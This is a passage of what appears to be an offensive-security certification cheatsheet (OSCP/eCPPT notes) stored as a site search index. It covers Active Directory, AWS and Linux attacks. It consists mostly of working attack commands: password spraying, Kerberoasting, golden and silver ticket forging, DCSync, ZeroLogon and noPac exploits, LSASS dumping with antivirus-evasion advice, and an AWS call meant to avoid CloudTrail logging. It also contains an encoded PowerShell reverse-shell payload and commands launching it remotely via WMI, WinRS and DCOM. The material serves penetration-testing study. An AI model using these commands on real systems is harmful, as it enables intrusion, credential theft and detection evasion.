/domain\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#enumerating-domain-shares","title":"Enumerating Domain Shares","text":"<p>Get Shares using PowerView</p> <pre><code>Find-DomainShare\n</code></pre> <p>Decrypt cpassword Found in DC sysvol share</p> <pre><code>gpp-decrypt \"[password]\"\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#active-directory-automated-enumeration","title":"Active Directory - Automated Enumeration","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#collecting-data-with-sharphound","title":"Collecting Data with SharpHound","text":"<pre><code>SharpHound.exe --CollectionMethod All  --ZipFileName output.zip\n\n## Using PS version\nImport-Module .\\Sharphound.ps1\nInvoke-BloodHound -CollectionMethod All -OutputDirectory C:\\tmp\\ -OutputPrefix \"corp audit\"\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#analysing-data-using-bloodhound","title":"Analysing Data using BloodHound","text":"<pre><code>apt install bloodhound\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#attacking-active-directory-authentication","title":"Attacking Active Directory Authentication","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#ntlm-authentication","title":"NTLM Authentication","text":"<p>NTLM authentication is used when a client authenticates to a server by IP address (instead of by hostname), or if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server. Likewise, third-party applications may choose to use NTLM authentication instead of Kerberos.</p> <p></p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#kerberos-authentication","title":"Kerberos Authentication","text":"<p>A key difference between these two protocols (based on the underlying systems) is that with NTLM authentication, the client starts the authentication process with the application server itself, as discussed in the previous section. On the other hand, Kerberos client authentication involves the use of a domain controller in the role of a Key Distribution Center (KDC). The client starts the authentication process with the KDC and not the application server. A KDC service runs on each domain controller and is responsible for session tickets and temporary session keys to users and computers.</p> <p></p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#cached-ad-credentials","title":"Cached AD Credentials","text":"\ud83d\udca1  Due to the mainstream popularity of Mimikatz and well-known detection signatures, consider avoiding using it as a standalone application and use methods discussed in the *Antivirus Evasion* Module instead. For example, execute Mimikatz directly from memory using an injector like [PowerShell](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1), or use a built-in tool like Task Manager to dump the entire [LSASS process memory](https://blog.cyberadvisors.com/technical-blog/attacks-defenses-dumping-lsass-no-mimikatz/), move the dumped data to a helper machine, and then load the data into [Mimikatz](http://www.fuzzysecurity.com/tutorials/18.html)."},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#performing-attacks-on-active-directory-authentication","title":"Performing Attacks on Active Directory Authentication","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#password-attacks_1","title":"Password Attacks","text":"<p>Get Password Policy</p> <pre><code>net accounts\n\nenum4linux -P [IP]\n</code></pre> <p>Password Spray Using Powershell DirectoryEntry</p> <pre><code>$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n$PDC = ($domainObj.PdcRoleOwner).Name\n$SearchString = \"LDAP://\"\n$SearchString += $PDC + \"/\"\n$DistinguishedName = \"DC=$($domainObj.Name.Replace('.', ',DC='))\"\n$SearchString += $DistinguishedName\nNew-Object System.DirectoryServices.DirectoryEntry($SearchString, \"[user]\", \"[password]!\")\n</code></pre> <p>Password Spray Using Powershell DomainPasswordSpray *Script*</p> <pre><code>Invoke-DomainPasswordSpray -Password [password]\n</code></pre> <p>https://github.com/dafthack/DomainPasswordSpray</p> <p>Password Spray through SMB</p> <pre><code>netexec smb [IP] -u [user] -p [password] --continue-on-success\n</code></pre> <p>Password Spray Through TGT Auth - Kerbrute</p> <pre><code>./kerbrute passwordspray --dc [ip] -d [domain] [userfile] [password]\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#as-rep-roasting","title":"AS-REP Roasting","text":"<p>AS-REP Roasting using impacket</p> <pre><code>## With Creds\nimpacket-GetNPUsers -dc-ip [ip]  -request -outputfile hashes.asreproast [domain]/[user]\n\n## Without Creds\nimpacket-GetNPUsers.py [domain]/ -dc-ip [IP] -usersfile [userFile] -format hashcat -outputfile hashes.asreproast\n</code></pre> <p>AS-REP Roasting using Rubeus</p> <pre><code>.\\Rubeus.exe asreproast /nowrap\n</code></pre> <p>AS-REP Roasting using PowerVew</p> <pre><code>Get-DomainUser -PreauthNotRequired\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#kerberoasting","title":"Kerberoasting","text":"<p>Kerberoasting using impacket</p> <pre><code>impacket-GetUserSPNs -request -dc-ip [IP] [domain]/[user]\n</code></pre> <p>Kerberoasting using Rubeus</p> <pre><code>.\\Rubeus.exe kerberoast /outfile:hashes.kerberoast\n</code></pre> <p>Kerberoasting using PowerView</p> <pre><code>Get-DomainUser -SPN | Get-DomainSPNTicket\n\nGet-DomainUser -Identity [user] | Get-DomainSPNTicket -Format Hashcat\n\nGet-DomainUser -SPN | Get-DomainSPNTicket | Export-Csv .\\output.csv -NoTypeInformation\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#silver-ticket","title":"Silver Ticket","text":"<pre><code>## Check ServicePrincipalName - e.g., HTTP/web04.corp.com\nGet-DomainUser -SPN | select ServicePrincipalName\nimpacket-GetUserSPNs -request -dc-ip [IP] [domain]/[user]\n\n## Check Access to the SPN - e.g., HTTP\niwr -UseDefaultCredentials [SPN]\niwr -UseDefaultCredentials http://web04.corp.com\n\n## Create Silver Ticket using mimikatz\nprivilege::debug\nkerberos::golden /sid:[DomainSID] /domain:[Domain] /target:[TargetSPN]  /service:[ServiceSPN] /rc4:[NTLM of SPN user who has access to] /user:[Any User] /ptt\n\n## Create Silver Ticket using mimikatz - Example\nkerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /target:web04.corp.com  /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeff /ptt\n\n## Validate Access to the SPN \niwr -UseDefaultCredentials [SPN]\niwr -UseDefaultCredentials http://web04.corp.com\niwr -UseDefaultCredentials http://web04.corp.com -o output\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#domain-controller-synchronization-dcsync","title":"Domain Controller Synchronization - DCsync","text":"<p>DCsync using mimikatz</p> <pre><code>privilege::debug\nlsadump::dcsync\nlsadump::dcsync /user:[domain]\\[user]\n</code></pre> <p>DCsync using impacket</p> <pre><code>impacket-secretsdump [domain]/[user]@[IP] -just-dc\nimpacket-secretsdump [domain]/[user]@[IP] -just-dc-user [user]\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#nopac-exploit","title":"NoPac Exploit","text":"<p>Check Vulnerability</p> <pre><code>netexec smb [IP] -u [user] -p [password] -M nopac\n</code></pre> <p>Exploit </p> <pre><code>## https://github.com/Ridter/noPac\n\npython3 noPac.py domain/user:'password' -dc-ip [IP] -use-ldap\n\npython3 noPac.py domain/user:'password' -dc-ip [IP] -use-ldap -shell\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#zerologon-exploit-exploit","title":"ZeroLogon Exploit Exploit","text":"<p>Check Vulnerability</p> <pre><code>netexec smb [IP] -u [user] -p [password] -M zerologon\n</code></pre> <p>Exploit</p> <pre><code>## https://github.com/dirkjanm/CVE-2020-1472\n\npython3 zerologon_tester.py &lt;dc-name&gt; &lt;dc-ip&gt;\n\nnetexec smb [IP] -u 'DC01$' -p ''\nimpacket-secretsdump 'DC01$'@[hostname] -dc-ip [IP]\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#dfscoerce-exploit","title":"DFSCoerce Exploit","text":"<p>Check Vulnerability</p> <pre><code>netexec smb [IP] -u [user] -p [password] -M coerce_plus\n</code></pre> <p>Exploit</p> <pre><code>## https://github.com/Wh04m1001/DFSCoerce\n\npython3 dfscoerce.py -u [user] -p [password] -d [domain.com] [Local IP] [Target Ip]\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#lateral-movement-in-active-directory","title":"Lateral Movement in Active Directory","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#active-directory-lateral-movement-techniques","title":"Active Directory Lateral Movement Techniques","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#wmi-and-winrm","title":"WMI and WinRM","text":"<p>Create Process on Remote Machine using WMI - e.g., calc</p> <pre><code>wmic /node:[IP] /user:[user] /password:[password] process call create \"calc\"\n</code></pre> <p>Create Process on Remote Machine using PowerShell - e.g., calc</p> <pre><code>$username = 'user';\n$password = 'password';\n$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;\n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;\n\n$options = New-CimSessionOption -Protocol DCOM\n$session = New-Cimsession -ComputerName [IP] -Credential $credential -SessionOption $Options \n$command = 'calc';\n\nInvoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};\n</code></pre> <p>Create Reverse Shell on Remote Machine using PowerShell</p> <pre><code>import sys\nimport base64\n\npayload = '$client = New-Object System.Net.Sockets.TCPClient(\"10.10.10.10\",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"&gt; \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'\n\ncmd = \"powershell -nop -w hidden -e \" + base64.b64encode(payload.encode('utf16')[2:]).decode()\n\nprint(cmd)\n</code></pre> <pre><code>python3 encode.py\n</code></pre> <pre><code>$username = 'user';\n$password = 'password';\n$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;\n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;\n$Options = New-CimSessionOption -Protocol DCOM\n$Session = New-Cimsession -ComputerName 10.10.10.10 -Credential $credential -SessionOption $Options\n$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...\nHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';\nInvoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};\n</code></pre> <p>Create Process on Remote Machine using WinRS </p> <pre><code>winrs -r:[hostname] -u:[user] -p:[password]  \"cmd /c hostname &amp; whoami\"\n</code></pre> <p>Create Reverse Shell on Remote Machine using WinRS </p> <pre><code>winrs -r:[hostname] -u:[user] -p:[password]  \"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...\nHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA\"\n</code></pre> <p>Create Reverse Shell on Remote Machine using PowerShell - PSSession</p> <pre><code>$username = 'user';\n$password = 'password';\n$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;\n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;\nNew-PSSession -ComputerName 10.10.10.10 -Credential $credential\nEnter-PSSession 1\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#psexec","title":"PsExec","text":"<p>Requirements </p> <ul> <li>The user needs to be in Administrators local group</li> <li>The ADMIN$ share must be available</li> <li>File and Printer Sharing has to be turned on</li> </ul> <p>Usage</p> <pre><code>.\\PsExec64.exe -i  \\\\[IP] -u [domain]\\[user] -p [password] cmd\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#pass-the-hash","title":"Pass the Hash","text":"<p>Requirements </p> <ul> <li>Requires an SMB connection through the firewall (commonly port 445),</li> <li>The Windows File and Printer Sharing feature to be enabled</li> <li>The ADMIN$ share must be available</li> </ul> <p>Usage</p> <pre><code>impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E [user]@[IP]\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#overpass-the-hash","title":"Overpass the Hash","text":"<p>Obtain Kerberos tickets without performing NTLM authentication over the network</p> <pre><code>sekurlsa::pth /user:[user] /domain:[domain] /ntlm:[NTLM] /run:powershell\n</code></pre> <p>Access Remote Machine Using PsExec</p> <pre><code>.\\PsExec.exe \\\\[Hostname] cmd\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#pass-the-ticket","title":"Pass the Ticket","text":"<p>Export the TGT/TGS Tickets</p> <pre><code>sekurlsa::tickets /export\n</code></pre> <p>List and Use the Exported Tickets</p> <pre><code>dir *.kirbi\n\n**.\\mimikatz.exe\nkerberos::ptt [.kirbi file]\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#dcom","title":"DCOM","text":"<p>Instantiate a remote MMC 2.0 application and Execute Commands</p> <pre><code>$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"10.10.10.10\"))\n\n$dcom.Document.ActiveView.ExecuteShellCommand(\"cmd\",$null,\"/c calc\",\"7\")\n</code></pre> <p>Instantiate a remote MMC 2.0 application and get Reverse Shell</p> <pre><code>$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"MMC20.Application.1\",\"10.10.10.10\"))\n\n$dcom.Document.ActiveView.ExecuteShellCommand(\"powershell\",$null,\"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdw...\",\"7\")\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#active-directory-persistence","title":"Active Directory Persistence","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#golden-ticket","title":"Golden Ticket","text":"\ud83d\udca1  If we can get our hands on the *krbtgt* password hash, we could create our own self-made custom TGTs, also known as [*golden tickets*](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don%27t-Get-It.pdf).   <p>Linux - Impacket</p> <pre><code>## with krbtgt NThash\nimpacket-ticketer -nthash [krbtgt hash] -domain-sid [domainSID] -domain [domain] -user-id [userId] [user]\n\n## with krbtgt aesKey - recomended\nimpacket-ticketer -aesKey [aesKey] -domain-sid [domainSID] -domain [domain] [user]\n\nexport KRB5CCNAME=[.ccache path]\nimpacket-psexec [domain]/[user]@[hostname] -k -no-pass\n</code></pre> <p>Windows - Mimikatz</p> <pre><code>privilege::debug\nlsadump::lsa /inject /name:krbtgt\nkerberos::purge\n\n## Submit ticket to current session\nkerberos::golden /user:[user] /domain:[domain] /sid:[domainSID] /krbtgt:[krbtgt hash] /ptt\n\n## Save ticket\nkerberos::golden /user:[user] /domain:[domain] /sid:[domainSID] /krbtgt:[krbtgt hash] /ticket:golden.kirbi\n\nkerberos::ptt goldem.kirbi\n\n## Ticket in use\n.\\PsExec.exe \\\\[hostname] cmd\n</code></pre> <p>Golden Ticket - HackTricks</p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#shadow-copies","title":"Shadow Copies","text":"\ud83d\udca1  To manage volume shadow copies, the Microsoft signed binary [*vshadow.exe*](https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample) is offered as part of the [Windows SDK](https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/).   <p>Store the copy on disk</p> <pre><code>vshadow.exe -nw -p  C:\n\ncopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\ntds\\ntds.dit c:\\ntds.dit.bak\n</code></pre> <p>Save the SYSTEM hive from the Windows registry</p> <pre><code>reg.exe save hklm\\system c:\\system.bak\n</code></pre> <p>Extract ntds database locally</p> <pre><code>impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#enumerating-aws-cloud-infrastructure","title":"Enumerating AWS Cloud Infrastructure","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#reconnaissance-of-cloud-resources-on-the-internet","title":"Reconnaissance of Cloud Resources on the Internet","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#domain-and-subdomain-reconnaissance","title":"Domain and Subdomain Reconnaissance","text":"\ud83d\udca1  The EC2 instance is a virtual machine in the AWS cloud. EC2 is a common service used to host websites, applications, and other services that require a server.   <p>Enumerate DNS</p> <pre><code>dnsenum [domain] --threads 100\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#service-specific-domains","title":"Service-specific Domains","text":"<p>Wordlist - <code>/usr/lib/cloud-enum/enum_tools/fuzz.txt</code></p> <p>Enumerate Buckets using cloud_enum</p> <pre><code>cloud_enum -k [bucket] --quickscan --disable-azure --disable-gcp\ncloud_enum -kf [bucket wordlist] --quickscan --disable-azure --disable-gcp\n\n## example\ncloud_enum -k offseclab-assets-public-axevtewi --quickscan --disable-azure --disable-gcp\n\ncloud_enum -kf keyfile.txt --quickscan --disable-azure --disable-gcp\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#reconnaissance-via-cloud-service-providers-api","title":"Reconnaissance via Cloud Service Provider's API","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#configure-aws-cli","title":"Configure AWS CLI","text":"<p>Create AWS Profile</p> <pre><code>aws configure --profile [AnyName]\n\naws configure list-profiles\n</code></pre> <p>Interact with AWS Profile</p> <pre><code>aws --profile [CreatedProfile] [command]\n\n## example\naws --profile [CreatedProfile] sts get-caller-identity\naws --profile [CreatedProfile] s3 ls \naws --profile [CreatedProfile] s3 ls s3://[bucker] --recursive\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#publicly-shared-resources","title":"Publicly Shared Resources","text":"<p>Get Publicly Available Images</p> <ul> <li>ec2 describe-images - list all the images that the account can read</li> <li>owners amazon - filter this list and show only AMIs provided by AWS</li> <li>executable-users all - ensure that all public AMIs will be listed</li> </ul> <pre><code>aws --profile attacker ec2 describe-images --owners amazon --executable-users all\n</code></pre> <p>Get Publicly Available Images Owend by Other User</p> <pre><code>aws --profile attacker ec2 describe-images --executable-users all --filters \"Name=description,Values=*Domain*\"\n\naws --profile attacker ec2 describe-images --executable-users all --filters \"Name=name,Values=*Domain*\"\n</code></pre> <p>Get Publicly Available Snapshots</p> <pre><code>aws --profile attacker ec2 describe-snapshots \n\naws --profile attacker ec2 describe-snapshots --filters \"Name=description,Values=*Domain*\"\n\naws --profile attacker ec2 describe-snapshots --filters \"Name=name,Values=*Domain*\"\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#obtaining-account-ids-from-s3-buckets","title":"Obtaining Account IDs from S3 Buckets","text":"<p>First, we'll choose a publicly readable bucket or object inside the target account. Because the bucket/object is publicly readable, we should be able to list the content of it with any IAM user of any AWS account. In the lab, we'll choose one of the publicly readable buckets.</p> <p>Then, we'll create a new IAM user in our attacker account. By default, IAM users don't have any permissions to execute any actions, so the new user won't be able to list the content of the public resource even when it's public.</p> <p>Next, we'll create a policy that will grant permissions to list buckets and read objects. However, we'll add the Condition that the read permission will only apply if the account ID that owns the bucket starts with the digit \"x\".</p> <p>After we apply the policy to the new IAM user, we'll test if we can list the bucket with the new user's credentials. We'll test the value x from 0 to 9 until we can list the bucket, meaning that we found the first digit of the account.</p> <p>Check the public resource</p> <pre><code>aws --profile [profile] s3 ls [public bucket]\n</code></pre> <p>Create new AIM user and assign KEYs</p> <pre><code>aws --profile [attacker profile] iam create-user --user-name [username]\n\naws --profile [attacker profile] iam create-access-key --user-name [username]\n</code></pre> <p>Configure Profile for Newly created IAM User</p> <pre><code>aws configure --profile [created IAM user]\n\naws --profile [created IAM user] sts get-caller-identity\n</code></pre> <p>Check access to Private Bucket</p> <pre><code>aws --profile [profile] s3 ls [bucket]\n\n## example\naws --profile enum s3 ls offseclab-assets-private-kaykoour\n</code></pre> <p>Create a policy that will allow for listing the content of the bucket and reading objects inside it - Condition = if AccountID starts with X</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"AllowResourceAccount\",\n            \"Effect\": \"Allow\",\n            \"Action\": [\n                \"s3:ListBucket\",\n                \"s3:GetObject\"\n            ],\n            \"Resource\": \"*\",\n            \"Condition\": {\n                \"StringLike\": {\"s3:ResourceAccount\": [\"0*\"]}\n            }\n        }\n    ]\n}\n</code></pre> <p>Assign Policy to Created IAM User</p> <pre><code>aws --profile [attacker profile] iam put-user-policy \\\n--user-name [created IAM user] \\\n--policy-name [Policy Name] \\\n--policy-document file://[filename]\n\naws --profile [attacker profile] iam list-user-policies --user-name [created IAM user]\n\n## Example\naws --profile attacker iam put-user-policy \\\n--user-name enum \\\n--policy-name s3-read \\\n--policy-document file://policy-s3-read.json\naws --profile attacker iam list-user-policies --user-name enum\n</code></pre> <p>Check the access with defined conditions using created IAM user</p> <pre><code>aws --profile [created IAM user] s3 ls [bucket]\n\n## example\naws --profile enum s3 ls offseclab-assets-private-kaykoour\n</code></pre> <p>Once we know that the policy starts with a digit, we can move to the next one by modifying the condition of the policy like so:</p> <pre><code>- __\"StringLike\": {\"s3:ResourceAccount\": [\"10*\"]}__\n- __\"StringLike\": {\"s3:ResourceAccount\": [\"11*\"]}__\n...\n- __\"StringLike\": {\"s3:ResourceAccount\": [\"18*\"]}__\n- __\"StringLike\": {\"s3:ResourceAccount\": [\"19*\"]}__\n</code></pre> <p>Automated Tool</p> <p>GitHub - WeAreCloudar/s3-account-search: S3 Account Search</p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#enumerating-iam-users-in-other-accounts","title":"Enumerating IAM Users in Other Accounts","text":"<p>Create an S3 bucket inside our attacker's account</p> <pre><code>aws --profile [attacker profile] s3 mb s3://offseclab-dummy-bucket-$RANDOM-$RANDOM-$RANDOM\n</code></pre> <p>Create policy that apply exist / nonexist users - Change Resource and Principal</p> <pre><code>{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Sid\": \"AllowUserToListBucket\",\n            \"Effect\": \"Allow\",\n            \"Resource\": \"arn:aws:s3:::offseclab-dummy-bucket-28967-25641-13328\",\n            \"Principal\": {\n                \"AWS\": [\"arn:aws:iam::123456789012:user/cloudadmin\"]\n            },\n            \"Action\": \"s3:ListBucket\"\n\n        }\n    ]\n}\n</code></pre> <p>Apply the created policy and check the response</p> <pre><code>aws --profile [attacker profile] s3api put-bucket-policy --bucket [created bucket] --policy file://[file.json]\n\n## example\naws --profile attacker s3api put-bucket-policy --bucket offseclab-dummy-bucket-28967-25641-13328 --policy file://grant-s3-bucket-read.json\n</code></pre> <p>Automated Brute Force Roles using Pacu</p> <pre><code>Pacu\nWhat would you like to name this new session? [domain]\nPacu (offseclab:No Keys Set) &gt; import_keys attacker\nPacu (offseclab:imported-attacker) &gt; ls\nPacu (offseclab:imported-attacker) &gt; help iam__enum_roles\nPacu (offseclab:imported-attacker) &gt; run iam__enum_roles --word-list /tmp/role-names.txt --account-id [accountId]\n</code></pre> <p>Set New Environment Credentials</p> <pre><code>aws configure set aws_access_key_id [access keyId] --profile roleprofile\naws configure set aws_secret_access_key [access key] --profile roleprofile\naws configure set aws_session_token [session token] --profile roleprofile\naws configure set region us-east-1 --profile roleprofile\naws configure set output json --profile roleprofile\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#initial-iam-reconnaissance","title":"Initial IAM Reconnaissance","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#examining-compromised-credentials","title":"Examining Compromised Credentials","text":"<p>Get IAM User Details</p> <pre><code>aws --profile [profile] sts get-caller-identity\n</code></pre> <p>Get IAM User Account using AccessKeyID</p> <pre><code>aws --profile [profile] sts get-access-key-info --access-key-id [key]\n</code></pre> <p>Get IAM User Details Without Logged in events/cloudtrails</p> <pre><code>aws --profile [profile] lambda invoke --function-name arn:aws:lambda:us-east-1:123456789012:function:nonexistent-function outfile\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#scoping-iam-permissions","title":"Scoping IAM permissions","text":"\ud83d\udca1  **Inline Policies** are directly linked to a single identity and exist only in that identity space. **Managed Policies** stand as distinct, reusable policies that can be associated with multiple identities.   <p>List inline policies and managed policies associated with the user </p> <pre><code>aws --profile [profile] iam list-user-policies --user-name [username]\n\naws --profile [profile] iam list-attached-user-policies --user-name [username]\n\n## Example\naws --profile target iam list-user-policies --user-name clouddesk-plove\n\naws --profile target iam list-attached-user-policies --user-name clouddesk-plove\n</code></pre> <p>List Groups of User</p> <pre><code>aws --profile [profile] iam list-groups-for-user --user-name [username]\n</code></pre> <p>List Policies Associated with Group</p> <pre><code>aws --profile [profile] iam list-group-policies --group-name [group]\n\naws --profile [profile] iam list-attached-group-policies --group-name [group]\n\n## Example\naws --profile target iam list-group-policies --group-name support\n\naws --profile target iam list-attached-group-policies --group-name support\n</code></pre> <p>Check Current Version of the Policy Since Policies Support Versioning</p> <pre><code>aws --profile [profile] iam list-policy-versions --policy-arn \"[arn]\"\n\n## Example\naws --profile target iam list-policy-versions --policy-arn \"arn:aws:iam::aws:policy/job-function/SupportUser\"\n</code></pre> <p>Check Policy Document With Associated Version</p> <pre><code>aws --profile [profile] iam get-policy-version --policy-arn \"[arn]\" --version-id [version]\n\n## Example\naws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#iam-resources-enumeration","title":"IAM Resources Enumeration","text":""},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#enumerating-iam-resources","title":"Enumerating IAM Resources","text":"<p>Check what actions this policy grants to enumerate IAM resources</p> <pre><code>aws --profile [profile] iam get-policy-version --policy-arn [arn] --version-id [version] | grep \"iam\"\n\n## Example\naws --profile target iam get-policy-version --policy-arn arn:aws:iam::aws:policy/job-function/SupportUser --version-id v8 | grep \"iam\"\n</code></pre> <p>Display a description of the command usage including a list of all available subcommands</p> <pre><code>aws --profile [profile] iam help | grep -E \"list-|get-|generate-\"\n\n## Example\naws --profile target iam help | grep -E \"list-|get-|generate-\"\n</code></pre> <p>IAM Resource Enumeration Commands</p> <pre><code>iam get-account-summary\niam list-users\niam list-policies --scope Local --only-attached\n\niam list-user-policies\niam get-user-policy\niam list-group-policies\niam get-group-policy\niam list-role-policies\niam get-role-policy\n\niam get-account-authorization-details --filter User Group LocalManagedPolicy Role\n\niam list-policy-versions --policy-arn [arn]\niam get-account-authorization-details --filter LocalManagedPolicy\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#processing-api-response-data-with-jmespath","title":"Processing API Response data with JMESPath","text":"<p>Filter data using JMESPath</p> <pre><code>aws --profile [profile] iam get-account-authorization-details --filter User --query \"UserDetailList[].UserName\"\n\naws --profile target iam get-account-authorization-details --filter User --query \"UserDetailList[0].[UserName,Path,GroupList]\"\n\naws --profile target iam get-account-authorization-details --filter User --query \"UserDetailList[?contains(UserName, 'admin')].{Name: UserName}\"\n</code></pre> <p>JMESPath \u2014 JMESPath</p>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#running-automated-enumeration-with-pacu","title":"Running Automated Enumeration with Pacu","text":"<p>Inital Access using Pacu</p> <pre><code>kal@kali:~$ Pacu\nWhat would you like to name this new session? [domain]\nPacu (offseclab:No Keys Set) &gt; import_keys [profile]\nPacu (offseclab:imported-attacker) &gt; ls\n</code></pre> <p>Example of Listing Users/Roles/Policies/Groups </p> <pre><code>help iam__enum_users_roles_policies_groups\nrun iam__enum_users_roles_policies_groups\n\nservices\ndata IAM\n</code></pre>"},{"location":"OSCP%20Materials/OSCP_Cheatsheet/#extracting-insights-from-enumeration-data","title":"Extracting Insights from Enumeration Data","text":"<p>https://github.com/ReversecLabs/awspx</p> <p>https://github.com/duo-labs/cloudmapper</p>"},{"location":"eCPPT%20Materials/Linux%20Exploitation/","title":"Linux Exploitation","text":""},{"location":"eCPPT%20Materials/Linux%20Exploitation/#information-gathering","title":"Information Gathering","text":"<p>Remote Enumeration <pre><code># OS Fingerprint\n$ nmap -O --osscan-guess &lt;IP_Address&gt;\n$ nmap -v -sT -O &lt;IP_Address&gt;\n\n\n# Enumerating NFS\n$ nmap -sT -sU -sV -p2049 &lt;IP_Address&gt;\n$ nmap --script nfs-ls,nfs-showmount,nfs-statfs &lt;IP_Address&gt;\n$ showmount -e &lt;IP_Address&gt;\n\n\n# Mount FNS\n$ mkdir -p /tmp/mountednfs\n$ mount -t nfs &lt;NFS SERVER IP&gt;:/home/bob /tmp/mountedfns -o nolock\n\n\n# Enumerating Portmapper (rpcbind)\n$ nmap --script rpc-grind,rpcinfo -p111 &lt;IP_Address&gt;\n$ rpcinfo -p &lt;IP_Address&gt;\n\n\n# Samba\n$ nmap -sT -sU -sV -p135,137,138,139,445 &lt;IP_Address&gt; --open\n\n$ nmap --script smb-enum-shares &lt;IP_Address&gt;\n$ smbclient -N -L &lt;IP_Address&gt;                 # Anonymous Login\n$ smbmap -H &lt;IP_Address&gt;                       # List Shares Permissions\n\n$ smbclient \\\\\\\\$IP\\\\Share                     # Interacting with share\n$ 